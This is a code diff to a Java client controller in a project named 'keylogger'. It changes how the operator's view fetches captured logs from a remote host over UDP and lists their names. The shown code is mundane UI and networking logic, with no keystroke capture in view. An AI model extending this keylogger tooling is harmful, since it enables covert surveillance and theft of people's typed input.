@@ -14,8 +14,7 @@ import com.hao.keylogger.views.ClientView;
 public class ClientLogController {
 	private ClientView view;
 	private Log log;
-	
-	UDPClientHelper udpClientHelper;
+	ArrayList<Log> logs;
 
 	public ClientLogController(ClientView view) {
 		super();
@@ -50,7 +49,6 @@ public class ClientLogController {
 			// the log will be displayed when it is fetched
 			new UDPClientHelper(this, view.getHostAddress(), view.getPort())
 			.fetchLog(date);
-			//displayLog();
 		} catch (SocketException | UnknownHostException e) {
 			view.showErrorMessage("Fetch log error", "Invalid host address or port!");
 			e.printStackTrace();
@@ -61,8 +59,16 @@ public class ClientLogController {
 		
 	}
 	
-	public void fetchAllLogs() {
-		ArrayList<Log> logs = udpClientHelper.fetchAllLogs();
+	public void fetchAllLogs(){
+		try {
+			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).fetchAllLogs();
+		} catch (SocketException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (UnknownHostException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 		// load to view
 	}
 	
@@ -72,7 +78,14 @@ public class ClientLogController {
 	 */
 	public void receiveLogFromServer(Log log) {
 		this.log = log;
+		ArrayList<String> logListNames = new ArrayList<String>();
+		logListNames.add(log.getName());
+		setLogList(logListNames);
 		displayLog();
+	}
+
+	private void setLogList(ArrayList<String> logListNames) {
+		view.setLogList(logListNames);
 	}
 
 }
